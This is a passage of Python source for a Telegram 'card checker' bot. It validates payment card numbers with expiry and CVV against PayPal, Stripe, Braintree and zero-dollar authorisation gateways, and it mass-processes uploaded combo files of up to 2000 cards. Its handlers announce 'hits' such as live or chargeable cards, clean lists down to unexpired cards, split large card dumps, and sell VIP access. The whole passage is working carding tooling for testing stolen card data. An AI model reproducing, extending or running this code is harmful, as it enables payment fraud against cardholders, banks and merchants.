⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{result}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    status = result_dict.get('status', 'declined')
    message = result_dict.get('message', '')
    if status == "approved":
        status_emoji = "🔥"
        status_text = "Approved"
    elif status == "live":
        status_emoji = "💵"
        status_text = "Live"
    else:
        status_emoji = "❌"
        status_text = "Declined"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    return premium_emoji(f"""🛡 #Auth $0 [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{message}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


async def format_braintree_response(card_full, result_dict, taken, user_id, mode="Single"):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    status = result_dict.get('status', 'ERROR')
    message = result_dict.get('message', '')
    bin_info = result_dict.get('bin_info', '')
    if status == "CHARGE":
        status_emoji = "🔥"
        status_text = "Charge 5$"
    elif status == "APPROVED":
        status_emoji = "💵"
        status_text = message or "Approved"
    elif status == "OTP":
        status_emoji = "🔐"
        status_text = "3DS / OTP"
    elif status == "DECLINE":
        status_emoji = "❌"
        status_text = "Declined"
    else:
        status_emoji = "⚠️"
        status_text = "Error"
    if user_id in ADMINS:
        user_status = "Admin 👑"
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        user_status = "Premium 💎"
    else:
        user_status = "Free User 🤖"
    resp_display = f"{status}: {message}" if message else status
    if bin_info:
        info = bin_info
    return premium_emoji(f"""💳 #Braintree [{mode}]
- - - - - - - - - - - - - - - - - - - - - -
💳 𝐂𝐚𝐫𝐝: <code>{card_full}</code>
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{resp_display[:100]}</code>
{status_emoji} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⏱ 𝐓𝐢𝐦𝐞: <code>{taken}s</code>
- - - - - - - - - - - - - - - - - - - - - -
📌 𝐈𝐧𝐟𝐨: <code>{info}</code>
🏦 𝐁𝐚𝐧𝐤: <code>{bank}</code>
🌐 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country}</code>
👤 𝐑𝐞𝐪 𝐁𝐲: <code>{user_id}</code> ({user_status})
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1""")


# ==================== /start ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    username = update.effective_user.username or "No Username"
    keyboard = [
        [
            InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds", style="primary"),
            InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds", style="success"),
        ],
        [
            InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds", style="danger"),
        ],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel", style="primary"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel", style="success"),
        ],
        [
            InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel", style="primary"),
            InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel", style="success"),
        ],
    ]
    await update.message.reply_text(
        premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==================== Callback Panels ====================
async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /bc [card] - Braintree Charge 5$ single\n• /auth [card] - Auth $0 check\n• /clean - Clean cards file\n• /parts [num] - Split file\n• /stop - Stop mass\n• /code [key] - Activate VIP"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /bc [card] - Braintree Charge 5$ single\n• /auth [card] - Auth $0 check"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        await query.answer("Admin only!", show_alert=True)
        return
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /banned_list - Show banned users\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal", style="primary")],
        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe", style="primary")],
        [InlineKeyboardButton("💳 Braintree Charge 5$", callback_data="check_braintree", style="success")],
        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth", style="success")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")],
    ]
    await query.edit_message_text(
        premium_emoji("💳 Choose check type:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")


async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")


async def check_braintree_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/bc [card]</code>"), parse_mode="HTML")


async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")


async def clean_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("🧹 Send cards file to clean:\nFormat: <code>number|mm|yy|cvv</code>"), parse_mode="HTML")


async def parts_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.edit_message_text(premium_emoji("📁 Send file then use:\n<code>/parts [number]</code>\n\nExample: <code>/parts 4</code>"), parse_mode="HTML")


async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start", style="danger")]]
    await query.edit_message_text(
        premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username or "No Username"
    keyboard = [
        [
            InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds", style="primary"),
            InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds", style="success"),
        ],
        [
            InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds", style="danger"),
        ],
        [
            InlineKeyboardButton("💳 Check", callback_data="check_panel", style="primary"),
            InlineKeyboardButton("📊 Stats", callback_data="stats_panel", style="success"),
        ],
        [
            InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel", style="primary"),
            InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel", style="success"),
        ],
    ]
    await query.edit_message_text(
        premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==================== Gateways Panel ====================
async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    if update.effective_user.id not in ADMINS:
        return
    if not GATEWAYS:
        await update.message.reply_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}", style="primary")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways", style="danger")])
    await update.message.reply_text(
        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    if query.from_user.id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        gateway_url = GATEWAYS[gate_num - 1]
        keyboard = [
            [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}", style="danger")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways", style="primary")],
        ]
        await query.edit_message_text(
            premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    if query.from_user.id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        GATEWAYS.pop(gate_num - 1)
        keyboard = []
        for i, gateway in enumerate(GATEWAYS, 1):
            keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}", style="primary")])
        keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways", style="danger")])
        await query.edit_message_text(
            premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    if not GATEWAYS:
        await query.edit_message_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}", style="primary")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways", style="danger")])
    await query.edit_message_text(
        premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    await query.delete_message()


# ==================== /cmds ====================
async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    commands_text = """👑 ADMIN:
• /add [url] - Add PayPal gateway
• /rmadd [num] - Remove gateway
• /show_gateways - Show gateways
• /ban_user [id] - Ban user
• /unban_user [id] - Unban user
• /banned_list - Show banned users
• /prm [id] [days] - Add VIP
• /rmprm [id] - Remove VIP
• /wafa [days] [max] - Generate keys
• /show_users - Show users
• /try [id] [msg] - DM user
• /SENT [msg] - Broadcast
• /addkey [pk] [sk] - Add Stripe key
• /rmkey [id] - Remove Stripe key

💎 VIP:
• Upload combo file - Mass checking (Max 2000)
• /st [card] - Stripe single
• /bc [card] - Braintree Charge 5$ single
• /auth [card] - Auth $0 check

🤖 FREE:
• /start - Start
• /cmds - Commands
• /pp [card] - PayPal single
• /st [card] - Stripe single
• /bc [card] - Braintree Charge 5$ single
• /auth [card] - Auth $0 check
• /clean - Clean cards file
• /parts [num] - Split file
• /stop - Stop mass
• /code [key] - Activate VIP"""
    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")


# ==================== /pp ====================
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter, gateway_index
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
        return
    card_full = " ".join(context.args)
    gateway_num = 0
    gateway_url = None
    gateway_name = "PayPal"
    if GATEWAYS:
        gateway_num = (gateway_index % len(GATEWAYS)) + 1
        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
        gateway_index += 1
    status, response = await check_card_api(card_full, gateway_url)
    text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
    await update.message.reply_text(text, parse_mode="HTML")
    if status == "approved" or status == "live":
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        if status == "approved":
            status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
        else:
            status_text = "💵 Insufficient Funds"
        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)


# ==================== /st ====================
async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not STRIPE_KEYS:
        await update.message.reply_text(premium_emoji("❌ No Stripe keys."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/st [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("💳 Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, check_stripe_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_stripe_response(card, result, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    result_upper = str(result).upper()
    if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge", result, "Stripe")
    elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Stripe")


# ==================== /bc — Braintree Charge 5$ ====================
async def bc_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not HAS_CFFI:
        await update.message.reply_text(premium_emoji("❌ curl_cffi not installed on server."), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/bc [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("💳 Braintree Charge 5$ checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result_dict = await loop.run_in_executor(None, check_braintree_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_braintree_response(card, result_dict, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    status = result_dict.get('status', 'ERROR')
    message = result_dict.get('message', '')
    user = update.effective_user
    username = user.username or user.first_name or "Unknown"
    if status == "CHARGE":
        hit_counter += 1
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge 5$", message, "Braintree Charge 5$")
    elif status == "APPROVED":
        hit_counter += 1
        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 " + (message or "Approved"), message, "Braintree Charge 5$")


# ==================== /auth ====================
async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    global hit_counter
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
            return
        last_check_time[user_id] = now
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
        return
    card = context.args[0]
    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
    start_time = time.time()
    loop = asyncio.get_event_loop()
    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
    taken = round(time.time() - start_time, 2)
    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
    await msg.edit_text(text, parse_mode="HTML")
    status = result_dict.get('status', 'declined')
    if status == "approved":
        hit_counter += 1
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Approved", result_dict.get('message', ''), "Auth $0")


# ==================== /stop ====================
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text(premium_emoji("🛑 Stopping..."), parse_mode="HTML")


async def stop_mass_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer("🛑 Stopping...")
    user_id = int(query.data.split("_")[2])
    stop_users[user_id] = True


# ==================== File Handler ====================
def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    if is_banned(user_id):
        return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    return mode == "single"


async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text(premium_emoji("❌ File arrays require Premium."), parse_mode="HTML")
        return
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        card_count = 0
        for line in lines:
            if re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line):
                card_count += 1
        if user_id not in ADMINS and user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
            if card_count > VIP_FILE_LIMIT:
                await update.message.reply_text(premium_emoji(f"❌ Max {VIP_FILE_LIMIT} cards for VIP!\n📊 Your file: {card_count} cards"), parse_mode="HTML")
                try:
                    os.remove(file_path)
                except:
                    pass
                return
        pending_files[user_id] = {"file_path": file_path, "chat_id": chat_id}
        keyboard = [
            [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal", style="primary")],
            [InlineKeyboardButton("💳 Stripe Check", callback_data="gateway_stripe", style="primary")],
            [InlineKeyboardButton("💳 Braintree Charge 5$", callback_data="gateway_braintree", style="success")],
            [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth", style="success")],
        ]
        await update.message.reply_text(
            premium_emoji(f"📁 File Received!\n💳 Cards: {card_count}\n\nChoose gateway:"),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


async def gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if await banned_guard_callback(query):
        return
    await query.answer()
    user_id = query.from_user.id
    gateway_type = query.data.split("_")[1]
    if user_id not in pending_files:
        await query.edit_message_text(premium_emoji("❌ File expired."), parse_mode="HTML")
        return
    user = query.from_user
    username = user.username or user.first_name or "Unknown"
    file_path = pending_files[user_id]["file_path"]
    chat_id = pending_files[user_id]["chat_id"]
    await query.edit_message_text(premium_emoji(f"✅ {gateway_type.upper()} selected! Processing..."), parse_mode="HTML")
    gateway_name_map = {
        "paypal": "PayPal",
        "stripe": "Stripe",
        "braintree": "Braintree Charge 5$",
        "auth": "Auth $0"
    }
    gateway_name = gateway_name_map.get(gateway_type, "Unknown")
    if gateway_type == "paypal":
        task = asyncio.create_task(process_paypal_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "stripe":
        task = asyncio.create_task(process_stripe_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "braintree":
        task = asyncio.create_task(process_braintree_file(file_path, chat_id, context, gateway_name, username))
    elif gateway_type == "auth":
        task = asyncio.create_task(process_auth_file(file_path, chat_id, context, gateway_name, username))
    user_tasks[user_id] = task
    del pending_files[user_id]


# ==================== Clean Cards ====================
async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /clean"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("🧹 Cleaning cards..."), parse_mode="HTML")
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/clean_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        total_lines = len(lines)
        valid_cards = []
        removed = 0
        current_year = datetime.now().year
        current_month = datetime.now().month
        for line in lines:
            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                removed += 1
                continue
            card = match[0]
            parts = card.split("|")
            if len(parts) < 4:
                removed += 1
                continue
            try:
                exp_month = int(parts[1])
                exp_year = int(parts[2])
                if exp_year < 100:
                    exp_year += 2000
                if exp_month < 1 or exp_month > 12:
                    removed += 1
                    continue
                if exp_year < current_year:
                    removed += 1
                    continue
                elif exp_year == current_year and exp_month < current_month:
                    removed += 1
                    continue
                valid_cards.append(card)
            except:
                removed += 1
                continue
        clean_file_path = f"downloads/clean_result_{user_id}_{int(time.time())}.txt"
        with open(clean_file_path, 'w', encoding='utf-8') as f:
            for card in valid_cards:
                f.write(card + "\n")
        private_count = len(valid_cards)
        private_percentage = (private_count / total_lines * 100) if total_lines > 0 else 0
        result_text = f"""🧹 𝐂𝐥𝐞𝐚𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
📊 𝐓𝐨𝐭𝐚𝐥 𝐜𝐚𝐫𝐝𝐬: <code>{total_lines}</code>
✅ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞: <code>{private_count}</code>
❌ 𝐏𝐮𝐛𝐥𝐢𝐜/𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
📈 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐩𝐞𝐫𝐜𝐞𝐧𝐭𝐚𝐠𝐞: <code>{private_percentage:.1f}%</code>
- - - - - - - - - - - - - - - -
🧹 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: <code>{removed}</code>
✅ 𝐊𝐞𝐩𝐭: <code>{private_count}</code>
- - - - - - - - - - - - - - - -
🤖 checker v1"""
        await msg.edit_text(premium_emoji(result_text), parse_mode="HTML")
        if private_count > 0:
            with open(clean_file_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, caption=premium_emoji(f"✅ Cleaned Cards ({private_count})"), parse_mode="HTML")
        try:
            os.remove(file_path)
            os.remove(clean_file_path)
        except:
            pass
    except Exception as e:
        await msg.edit_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")


# ==================== Parts ====================
async def parts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await banned_guard(update):
        return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(premium_emoji("💡 Reply to a file with /parts [number]"), parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(premium_emoji("💡 Usage: <code>/parts [number]</code>"), parse_mode="HTML")
        return
    try:
        num_parts = int(context.args[0])
        if num_parts < 2:
            await update.message.reply_text(premium_emoji("❌ Minimum parts is 2"), parse_mode="HTML")
            return
    except:
        await update.message.reply_text(premium_emoji("❌ Invalid number"), parse_mode="HTML")
        return
    msg = await update.message.reply_text(premium_emoji("📁 Splitting file..."), parse_mode="HTML")
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.reply_to_message.document.get_file()
        file_path = f"downloads/parts_{user_id}_{int(time.time())}.txt"
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        valid_cards = []
        for line in lines:
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                valid_cards.append(match[0])
        total_cards = len(valid_cards)
        if total_cards < 1000:
            await msg.edit_text(premium_emoji(f"❌ Minimum file for split is 1000 cards!\n📊 Your file: {total_cards} cards"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        cards_per_part = total_cards // num_parts
        if cards_per_part < 1:
            await msg.edit_text(premium_emoji("❌ Too many parts for this file"), parse_mode="HTML")
            try:
                os.remove(file_path)
            except:
                pass
            return
        username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        result_text = f"""📁 𝐏𝐚𝐫𝐭𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
- - - - - - - - - - - - - - - -
⚡ 𝐏𝐚𝐫𝐭𝐬: <code>{num_parts}</code>
